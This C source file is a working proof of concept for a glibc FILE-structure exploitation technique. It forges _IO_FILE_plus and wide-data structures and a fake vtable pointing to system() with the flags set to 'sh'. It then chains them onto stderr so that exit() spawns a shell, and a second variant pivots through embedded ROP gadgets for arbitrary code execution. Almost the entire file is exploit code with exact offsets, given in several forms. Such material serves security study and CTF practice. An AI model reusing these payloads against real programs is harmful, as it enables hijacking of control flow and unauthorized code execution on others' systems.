#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "utils.h"

void payload1() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");
    
    fprintf(stderr, "[LOG]: _IO_FILE_plus size = 0x%lx\n", sizeof(struct _IO_FILE_plus));
    fprintf(stderr, "[LOG]: _IO_wide_data size = 0x%lx\n", sizeof(struct _IO_wide_data));
    fprintf(stderr, "[LOG]: _IO_wide_data.vtable size = 0x%x\n", 0xe0);
    fprintf(stderr, "[LOG]: _IO_wfile_jumps = %p\n", _IO_wfile_jumps);

    struct _IO_FILE_plus *apple;
    struct _IO_wide_data *apple_wide_data;
    void(**apple_wide_data_vtable)(void);

    apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);
    apple->file._wide_data = apple_wide_data;

    /* payload to get shell */
    memcpy(&apple->file._flags, "  sh;\x00", 6);
    apple_wide_data_vtable[13] = (void*)system;
    
    /* _IO_flush_all_lockp -> _IO_OVERFLOW */
    apple->file._mode = 0;
    apple->file._IO_write_ptr = (void *)1;
    apple->file._IO_write_base = (void *)0;
    // or 
    // apple->file._mode = 1;
    // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // apple->file._wide_data->_IO_write_base = (void*)0;

    /* _IO_wfile_overflow -> _IO_wdoallocbuf */
    apple->file._flags &= ~_IO_NO_WRITES;
    apple->file._flags &= ~_IO_CURRENTLY_PUTTING;
    apple->file._wide_data->_IO_write_base = (void*)0;
    
    /* _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp) */
    apple->file._wide_data->_IO_buf_base = (void*)0;
    apple->file._flags &= ~_IO_UNBUFFERED;

    apple->vtable = _IO_wfile_jumps;
    apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
    
    stderr->_chain = &apple->file;
}

void payload1_bare() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;

    apple = malloc(0xe0);                                           // apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(0xe8);                                 // apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);                          // apple_wide_data_vtable = malloc(0xe0);
    *(u64*)(apple + 0xa0) = (u64)apple_wide_data;                   // apple->file._wide_data = apple_wide_data;

    /* payload to get shell */
    *(u64*)(apple + 0x00) = 0x03b68732020;                          // memcpy(&apple->file._flags, "  sh;\x00", 6);
    *(u64*)(apple_wide_data_vtable + 0x68) = (u64)system;           // apple_wide_data_vtable[13] = (void*)system;
    
    /* _IO_flush_all_lockp -> _IO_OVERFLOW */
    *(u64*)(apple + 0xc0) = 0;                                      // apple->file._mode = 0;
    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
    // or 
    // *(u64*)(apple + 0xc0) = 1;                                   // apple->file._mode = 1
    // *(u64*)(apple_wide_data + 0x20) = 1;                         // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // *(u64*)(apple_wide_data + 0x18) = 0;                         // apple->file._wide_data->_IO_write_base = (void*)0;

    /* _IO_wfile_overflow -> _IO_wdoallocbuf */
    *(u32*)(apple + 0x00) &= (int)0xfffffff7;                       // apple->file._flags &= ~_IO_NO_WRITES;
    *(u32*)(apple + 0x00) &= (int)0xfffff7ff;                       // apple->file._flags &= ~_IO_CURRENTLY_PUTTING;
    *(u64*)(apple_wide_data + 0x18) = 0;                            // apple->file._wide_data->_IO_write_base = (void*)0;
    
    /* _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp) */
    *(u64*)(apple_wide_data + 0x30) = 0;                            // apple->file._wide_data->_IO_buf_base = (void*)0;
    *(u32*)(apple + 0x00) &= 0xfffffffd;                            // apple->file._flags &= ~_IO_UNBUFFERED;

    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                   // apple->vtable = _IO_wfile_jumps;
    *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable;  // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
    
    stderr->_chain = (void*)apple;
}

void payload1_sum() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;

    apple = malloc(0xe0);
    apple_wide_data = malloc(0xe8);
    apple_wide_data_vtable = malloc(0xe0);

    *(u64*)(apple + 0x00) = 0x03b68732020 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    *(u64*)(apple + 0x20) = 0;
    *(u64*)(apple + 0x28) = 1;
    *(u64*)(apple + 0xa0) = (u64)apple_wide_data;
    *(u64*)(apple + 0xc0) = 0;
    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;

    *(u64*)(apple_wide_data + 0x18) = 0;
    *(u64*)(apple_wide_data + 0x30) = 0;
    *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable;
    
    *(u64*)(apple_wide_data_vtable + 0x68) = (u64)system;
    
    // or 
    // *(u64*)(apple + 0x00) = 0x03b68732020 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    // *(u64*)(apple + 0xa0) = (u64)apple_wide_data;
    // *(u64*)(apple + 0xc0) = 1;
    // *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;

    // *(u64*)(apple_wide_data + 0x18) = 0;
    // *(u64*)(apple_wide_data + 0x20) = 1;
    // *(u64*)(apple_wide_data + 0x30) = 0;
    // *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable;
    
    // *(u64*)(apple_wide_data_vtable + 0x68) = (u64)system;

    stderr->_chain = (void*)apple;
}

void payload1_sum_into_one() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;

    apple = malloc(0xe8);

    *(u64*)(apple + 0x00) = 0x03b68732020 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    *(u64*)(apple + 0x20) = 0;
    *(u64*)(apple + 0x28) = 1;
    *(u64*)(apple + 0xa0) = (u64)apple;
    *(u64*)(apple + 0xc0) = 0;
    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;

    *(u64*)(apple + 0x18) = 0;
    *(u64*)(apple + 0x30) = 0;
    *(u64*)(apple + 0xe0) = (u64)apple;
    
    *(u64*)(apple + 0x68) = (u64)system;
    
    // or 
    // *(u64*)(apple + 0x00) = 0x03b68732020 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    // *(u64*)(apple + 0xa0) = (u64)apple;
    // *(u64*)(apple + 0xc0) = 1;
    // *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;

    // *(u64*)(apple + 0x18) = 0;
    // *(u64*)(apple + 0x20) = 1;
    // *(u64*)(apple + 0x30) = 0;
    // *(u64*)(apple + 0xe0) = (u64)apple;
    
    // *(u64*)(apple + 0x68) = (u64)system;

    stderr->_chain = (void*)apple;
}



void trigger1() {
    exit(0);
}

void getshell() {
    payload1();
    // payload1_bare();
    // payload1_sum();
    // payload1_sum_into_one();
    trigger1();
}

__attribute__((section(".text")))
const unsigned char svcudp_reply_26_gadget []  = { 
    0x48, 0x8b, 0x6f, 0x48,                   /* <svcudp_reply+26>: mov    0x48(%rdi),%rbp */
    0x48, 0x8b, 0x45, 0x18,                   /* <svcudp_reply+30>: mov    0x18(%rbp),%rax */
    0x4c, 0x8d, 0x6d, 0x10,                   /* <svcudp_reply+34>: lea    0x10(%rbp),%r13 */
    0xc7, 0x45, 0x10, 0x00, 0x00, 0x00, 0x00, /* <svcudp_reply+38>: movl   $0x0,0x10(%rbp) */
    0x4c, 0x89, 0xef,                         /* <svcudp_reply+45>: mov    %r13,%rdi       */
    0xff, 0x50, 0x28,                         /* <svcudp_reply+48>: call   *0x28(%rax)     */
};
__attribute__((section(".text")))
const unsigned char leave_ret_gadget []  = { 
    0xc9,                                     /* leave */
    0xc3                                      /* ret */
};

__attribute__((section(".text")))
const unsigned char pop_rax_pop_rax_ret_gadget []  = { 
    0x58,                                     /* popq %rax */
    0x58,                                     /* popq %rax */
    0xc3                                      /* ret */
};


void payload2() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");
    
    fprintf(stderr, "[LOG]: _IO_FILE_plus size = 0x%lx\n", sizeof(struct _IO_FILE_plus));
    fprintf(stderr, "[LOG]: _IO_wide_data size = 0x%lx\n", sizeof(struct _IO_wide_data));
    fprintf(stderr, "[LOG]: _IO_wide_data.vtable size = 0x%x\n", 0xe0);
    fprintf(stderr, "[LOG]: _IO_wfile_jumps = %p\n", _IO_wfile_jumps);

    struct _IO_FILE_plus *apple;
    struct _IO_wide_data *apple_wide_data;
    void(**apple_wide_data_vtable)(void);
    u8* svcudp_reply_chuck;
    
    apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);
    apple->file._wide_data = apple_wide_data;

    /* payload to arbitrary code execution */
    svcudp_reply_chuck = malloc(0x100);
    *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    // ROP ...
    *(u64*)((u8*)apple + 0x48) = (u64)svcudp_reply_chuck;
    apple_wide_data_vtable[13] = (void*)svcudp_reply_26_gadget;
    
    /* _IO_flush_all_lockp -> _IO_OVERFLOW */
    apple->file._mode = 0;
    apple->file._IO_write_ptr = (void *)1;
    apple->file._IO_write_base = (void *)0;
    // or 
    // apple->file._mode = 1;
    // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // apple->file._wide_data->_IO_write_base = (void*)0;

    /* _IO_wfile_overflow -> _IO_wdoallocbuf */
    apple->file._flags &= ~_IO_NO_WRITES;
    apple->file._flags &= ~_IO_CURRENTLY_PUTTING;
    apple->file._wide_data->_IO_write_base = (void*)0;
    
    /* _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp) */
    apple->file._wide_data->_IO_buf_base = (void*)0;
    apple->file._flags &= ~_IO_UNBUFFERED;

    apple->vtable = _IO_wfile_jumps;
    apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
    
    stderr->_chain = &apple->file;
}

void payload2_bare() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;
    u8* svcudp_reply_chuck;

    apple = malloc(0xe0);                                           // apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(0xe8);                                 // apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);                          // apple_wide_data_vtable = malloc(0xe0);
    *(u64*)(apple + 0xa0) = (u64)apple_wide_data;                   // apple->file._wide_data = apple_wide_data;

    /* payload to arbitrary code execution */
    svcudp_reply_chuck = malloc(0x100);
    *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    // ROP ...
    *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;
    *(u64*)(apple_wide_data_vtable + 0x68) = (u64)svcudp_reply_26_gadget;
    
    /* _IO_flush_all_lockp -> _IO_OVERFLOW */
    *(u64*)(apple + 0xc0) = 0;                                      // apple->file._mode = 0;
    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
    // or 
    // *(u64*)(apple + 0xc0) = 1;                                   // apple->file._mode = 1;
    // *(u64*)(apple_wide_data + 0x20) = 1;                         // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // *(u64*)(apple_wide_data + 0x18) = 0;                         // apple->file._wide_data->_IO_write_base = (void*)0;

    /* _IO_wfile_overflow -> _IO_wdoallocbuf */
    *(u32*)(apple + 0x00) &= (int)0xfffffff7;                       // apple->file._flags &= ~_IO_NO_WRITES;
    *(u32*)(apple + 0x00) &= (int)0xfffff7ff;                       // apple->file._flags &= ~_IO_CURRENTLY_PUTTING;
    *(u64*)(apple_wide_data + 0x18) = 0;                            // apple->file._wide_data->_IO_write_base = (void*)0;
    
    /* _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp) */
    *(u64*)(apple_wide_data + 0x30) = 0;                            // apple->file._wide_data->_IO_buf_base = (void*)0;
    *(u32*)(apple + 0x00) &= 0xfffffffd;                            // apple->file._flags &= ~_IO_UNBUFFERED;

    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                   // apple->vtable = _IO_wfile_jumps;
    *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable;  // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
    
    stderr->_chain = (void*)apple;
}

void payload2_sum() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;
    u8* svcudp_reply_chuck;

    apple = malloc(0xe0);                                           // apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(0xe8);                                 // apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);                          // apple_wide_data_vtable = malloc(0xe0);
    svcudp_reply_chuck = malloc(0x100);

    *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
    *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;
    *(u64*)(apple + 0xa0) = (u64)apple_wide_data;                   // apple->file._wide_data = apple_wide_data;
    *(u64*)(apple + 0xc0) = 0;                                      // apple->file._mode = 0;
    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                   // apple->vtable = _IO_wfile_jumps;

    *(u64*)(apple_wide_data + 0x18) = 0;                            // apple->file._wide_data->_IO_write_base = (void*)0;
    *(u64*)(apple_wide_data + 0x30) = 0;                            // apple->file._wide_data->_IO_buf_base = (void*)0;
    *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable;  // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;

    *(u64*)(apple_wide_data_vtable + 0x68) = (u64)svcudp_reply_26_gadget;

    *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    // ROP ...

    // or 
    // *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    // *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;
    // *(u64*)(apple + 0xa0) = (u64)apple_wide_data;                  // apple->file._wide_data = apple_wide_data;
    // *(u64*)(apple + 0xc0) = 1;                                     // apple->file._mode = 1;
    // *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                  // apple->vtable = _IO_wfile_jumps;

    // *(u64*)(apple_wide_data + 0x18) = 0;                           // apple->file._wide_data->_IO_write_base = (void*)0;
    // *(u64*)(apple_wide_data + 0x20) = 1;                           // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // *(u64*)(apple_wide_data + 0x30) = 0;                           // apple->file._wide_data->_IO_buf_base = (void*)0;
    // *(u64*)(apple_wide_data + 0xe0) = (u64)apple_wide_data_vtable; // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;

    // *(u64*)(apple_wide_data_vtable + 0x68) = (u64)svcudp_reply_26_gadget;

    // *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    // *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    // *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    // *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    // *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    
    stderr->_chain = (void*)apple;
}

void payload2_sum_into_one() {
    void *_IO_wfile_jumps = load_symbol("_IO_wfile_jumps");

    u8* apple;
    u8* apple_wide_data;
    u8* apple_wide_data_vtable;
    u8* svcudp_reply_chuck;

    apple = malloc(0xe0);                                           // apple = malloc(sizeof(struct _IO_FILE_plus));
    apple_wide_data = malloc(0xe8);                                 // apple_wide_data = malloc(sizeof(struct _IO_wide_data));
    apple_wide_data_vtable = malloc(0xe0);                          // apple_wide_data_vtable = malloc(0xe0);
    svcudp_reply_chuck = malloc(0x100);

    *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    *(u64*)(apple + 0x18) = 0;                                      // apple->file._wide_data->_IO_write_base = (void*)0;
    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
    *(u64*)(apple + 0x30) = 0;                                      // apple->file._wide_data->_IO_buf_base = (void*)0;
    *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;                // <svcudp_reply+26>: mov    0x48(%rdi),%rbp
    *(u64*)(apple + 0x68) = (u64)svcudp_reply_26_gadget;            // (wint_t)_IO_WDOALLOCATE (fp)
    *(u64*)(apple + 0xa0) = (u64)apple;                             // apple->file._wide_data = apple_wide_data;
    *(u64*)(apple + 0xc0) = 0;                                      // apple->file._mode = 0;
    *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                   // apple->vtable = _IO_wfile_jumps;
    *(u64*)(apple + 0xe0) = (u64)apple;                             // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;

    *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    // ROP ...

    // or 
    // *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
    // *(u64*)(apple + 0x18) = 0;                           // apple->file._wide_data->_IO_write_base = (void*)0;
    // *(u64*)(apple + 0x20) = 1;                           // apple->file._wide_data->_IO_write_ptr = (void*)1;
    // *(u64*)(apple + 0x30) = 0;                           // apple->file._wide_data->_IO_buf_base = (void*)0;
    // *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;
    // *(u64*)(apple + 0x68) = (u64)svcudp_reply_26_gadget;
    // *(u64*)(apple + 0xa0) = (u64)apple;                  // apple->file._wide_data = apple_wide_data;
    // *(u64*)(apple + 0xc0) = 1;                           // apple->file._mode = 1;
    // *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;        // apple->vtable = _IO_wfile_jumps;
    // *(u64*)(apple + 0xe0) = (u64)apple;                  // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;

    // *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
    // *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
    // *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
    // *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
    // *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
    
    stderr->_chain = (void*)apple;
}

void ArbitraryCodeExecution() {
    payload2();
    trigger1();
}

int main () {
    ArbitraryCodeExecution();
}
